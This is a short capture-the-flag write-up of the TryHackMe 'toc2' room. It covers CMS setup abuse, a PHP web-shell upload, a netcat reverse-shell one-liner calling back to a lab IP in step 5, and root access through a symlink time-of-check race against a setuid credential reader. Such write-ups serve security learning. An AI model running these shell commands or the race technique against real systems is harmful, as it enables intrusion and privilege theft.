# toc2

https://tryhackme.com/room/toc2

"It's a setup... Can you get the flags in time?"

Interesting room! Sort of an education in a specific vulnerability.

1. Recon showed 80 and 22. On 80 was a holding page that gave some credentials, without specifying what those credentials were for.
2. `robots.txt` revealed a sub dir containing a cms setup file, and also in a comment gave the name of a local database.
3. Running the setup file, I created a new cms installation using the credentials from the home page and the database name when prompted for database details.
4. Logging in, under a File Manager, I could upload arbitary files. Uploading php web shells directly didn't seem to work (they were rendered as text/html), but I found uploading one as a text file then renaming it to php, before navigating to it's path directly worked. The direct navigation might have worked without renaming - by default, the file manager used some sort of module manager to load the files which might have broken the web shell.
5. With the web shell in place, I set up a reverse shell and got access as www-data (standard `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.205.196 4444 >/tmp/f` worked)
6. The only home folder was for a user named 'frank', where the user flag was readable. Also within was a note that gave the users password; this allowed me to drop my shell and ssh in normally.
7. Under the user's folder was a 'root_access' folder containing a suid binary called `readcreds` and its C code (`readcreds.c`), along with a root-only file called `root_password_backup`. The suid binary would, however, only read files the user had access to, suid be damned - running it against the root_password_backup failed.
8. The room talks about a linux file access race condition, where in the code if it uses the path to check access and then the path again to read, if you rename the file the path is pointing to between these checks you can bypass such access control. The video linked to is this one by the excellent LiveOverflow: https://www.youtube.com/watch?v=5g137gsB9Wk. In the video he uses a linux syscall to rapidly rename the files, but the C code here actually waits deliberately for a full second, so this was not necessary.
9. To get root I created a dummy file and created a symlink to it, e.g. `ln -s dummyfile myfile`, then in a separate window I readied (but didn't run yet!) `rm myfile && ln -s root_password_backup myfile`. Then in the first window, I started `readcreds myfile` and quickly switched over and ran the rename command. First try: got the root creds :)

Flag was in the root folder as normal, after switching to the root user with their creds. Interesting room.
